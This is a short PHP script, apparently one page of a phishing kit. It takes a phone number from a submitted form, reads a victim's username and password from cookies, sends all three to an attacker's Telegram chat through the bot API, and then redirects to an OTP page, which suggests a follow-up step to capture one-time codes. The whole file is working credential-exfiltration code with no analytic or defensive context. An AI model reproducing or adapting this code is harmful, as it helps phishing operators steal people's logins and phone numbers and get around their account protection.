<?php
include("config.php");
setcookie("number", $_POST['number'], time() + 86400, "/");


//   $chat_id = $chat_id
//   " . $telebot . " = " . $telebot . "


$data = [
'chat_id' => $chat_id,
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: otp.php");

?>
